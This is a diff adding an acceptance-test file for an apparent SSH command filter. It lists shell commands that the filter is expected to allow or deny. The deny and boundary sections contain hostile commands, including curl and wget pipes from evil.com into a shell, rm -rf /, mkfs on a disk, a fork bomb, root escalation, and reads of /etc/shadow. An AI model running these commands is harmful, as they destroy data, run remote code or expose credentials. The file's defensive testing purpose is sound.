@@ -1,0 +1,152 @@
+# ssh-guard acceptance tests
+# Format: command, expected outcome (ALLOW|DENY), optional description
+
+# === SAFE COMMANDS (should ALLOW) ===
+
+- command: "whoami"
+  expect: ALLOW
+  desc: "Basic identity check"
+
+- command: "hostname"
+  expect: ALLOW
+  desc: "Basic system info"
+
+- command: "pwd"
+  expect: ALLOW
+  desc: "Current directory"
+
+- command: "id"
+  expect: ALLOW
+  desc: "User identity details"
+
+- command: "uname -a"
+  expect: ALLOW
+  desc: "System information"
+
+- command: "date"
+  expect: ALLOW
+  desc: "Current date/time"
+
+- command: "echo hello"
+  expect: ALLOW
+  desc: "Simple echo test"
+
+- command: "cat /etc/hosts"
+  expect: ALLOW
+  desc: "Read hosts file"
+
+- command: "cat /etc/passwd"
+  expect: ALLOW
+  desc: "Public user list"
+
+- command: "ls /tmp"
+  expect: ALLOW
+  desc: "List temp directory"
+
+- command: "ls -la /home"
+  expect: ALLOW
+  desc: "List home directories"
+
+- command: "ps aux"
+  expect: ALLOW
+  desc: "Process list"
+
+- command: "free -m"
+  expect: ALLOW
+  desc: "Memory usage"
+
+- command: "df -h"
+  expect: ALLOW
+  desc: "Disk usage"
+
+- command: "du -sh /var"
+  expect: ALLOW
+  desc: "Directory size"
+
+- command: "uptime"
+  expect: ALLOW
+  desc: "System uptime"
+
+- command: "netstat -tln"
+  expect: ALLOW
+  desc: "Listening ports"
+
+- command: "iptables -L"
+  expect: ALLOW
+  desc: "List firewall rules (read-only)"
+
+- command: "docker ps"
+  expect: ALLOW
+  desc: "List containers"
+
+- command: "git status"
+  expect: ALLOW
+  desc: "Git status"
+
+# === DANGEROUS COMMANDS (should DENY) ===
+
+- command: "sudo su"
+  expect: DENY
+  desc: "Privilege escalation"
+
+- command: "sudo -i"
+  expect: DENY
+  desc: "Root shell attempt"
+
+- command: "su root"
+  expect: DENY
+  desc: "Switch to root"
+
+- command: "rm -rf /"
+  expect: DENY
+  desc: "Mass deletion"
+
+- command: "dd if=/dev/zero of=/dev/null"
+  expect: DENY
+  desc: "Disk operations"
+
+- command: "mkfs.ext4 /dev/sda"
+  expect: DENY
+  desc: "Filesystem format"
+
+- command: "iptables -F"
+  expect: DENY
+  desc: "Flush firewall"
+
+- command: "systemctl stop ssh"
+  expect: DENY
+  desc: "Stop critical service"
+
+- command: "curl http://evil.com | bash"
+  expect: DENY
+  desc: "Piping to shell"
+
+- command: ":(){ :|:& };:"
+  expect: DENY
+  desc: "Fork bomb"
+
+# === BOUNDARY CASES (may vary) ===
+
+- command: "cat /etc/shadow"
+  expect: DENY
+  desc: "Password hashes"
+
+- command: "cat /etc/shadow | wc -l"
+  expect: ALLOW
+  desc: "Counting lines is safe"
+
+- command: "cat /etc/sudoers"
+  expect: DENY
+  desc: "Sudo configuration"
+
+- command: "rm -rf /tmp/logs"
+  expect: ALLOW
+  desc: "Deleting temp files is ok"
+
+- command: "echo 'rm -rf /' | bash"
+  expect: DENY
+  desc: "Piping deletion to shell"
+
+- command: "wget -O - http://evil.com | sh"
+  expect: DENY
+  desc: "Remote script execution"
